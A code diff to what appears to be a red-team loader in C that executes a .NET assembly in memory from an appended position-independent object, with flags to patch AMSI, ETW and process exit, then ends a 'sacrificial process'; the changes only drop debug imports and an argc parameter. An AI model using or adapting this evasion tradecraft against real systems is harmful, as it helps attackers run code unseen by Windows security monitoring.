@@ -18,11 +18,6 @@ WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, 
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
 
-// Debugging Only
-WINBASEAPI VOID WINAPI KERNEL32$DebugBreak();
-WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId();
-
-
 /**
  * Linked resources
  */
@@ -37,7 +32,6 @@ typedef HRESULT (*EXECUTE_ASSEMBLY_PICO)(
     char *assembly, 
     size_t assembly_len, 
     WCHAR *argv[], 
-    int argc,
     BOOL patchExit,
     BOOL patchAmsi,
     BOOL patchEtw
@@ -117,8 +111,7 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 void run_clr_pico(
     WIN32FUNCS * funcs, 
     char * srcPico, 
-    LPCWSTR* assemblyArgs, 
-    size_t assemblyArgLen,
+    LPCWSTR* assemblyArgs,
     BOOL patchExitFlag,
     BOOL patchAmsiflag,
     BOOL patchEtwflag
@@ -149,7 +142,6 @@ void run_clr_pico(
         assembly, 
         assembly_len, 
         assemblyArgs, 
-        assemblyArgLen,
         patchExitFlag,
         patchAmsiflag,
         patchEtwflag
@@ -165,23 +157,22 @@ void go()
 {
 	// Resolve necessary WIN32 APIs.
 	WIN32FUNCS funcs;
-	funcs.LoadLibraryA = KERNEL32$LoadLibraryA;
-	funcs.GetProcAddress = KERNEL32$GetProcAddress;
-	funcs.VirtualAlloc = KERNEL32$VirtualAlloc;
-	funcs.VirtualFree = KERNEL32$VirtualFree;
+	funcs.LoadLibraryA      = KERNEL32$LoadLibraryA;
+	funcs.GetProcAddress    = KERNEL32$GetProcAddress;
+	funcs.VirtualAlloc      = KERNEL32$VirtualAlloc;
+	funcs.VirtualFree       = KERNEL32$VirtualFree;
 	
 	// Get a pointer to the section containing our PICO.
 	char *pico = findAppendedPICO();
 	
 	// Arguments to pass to the assembly.
-	int argc;
 	LPCWSTR cmdline = (LPCWSTR)&__CMDLINE__;
     BOOL patchExitflag  = (BOOL)&__PATCHEXITFLAG__;
 	BOOL patchAmsiflag  = (BOOL)&__PATCHAMSIFLAG__;
 	BOOL patchEtwflag   = (BOOL)&__PATCHETWFLAG__;
 
 	// Run the PICO.
-	run_clr_pico(&funcs, pico, cmdline, argc, patchExitflag, patchAmsiflag, patchEtwflag);
+	run_clr_pico(&funcs, pico, cmdline, patchExitflag, patchAmsiflag, patchEtwflag);
 
     // Important! Exit sacrificial process
     KERNEL32$ExitProcess(0);
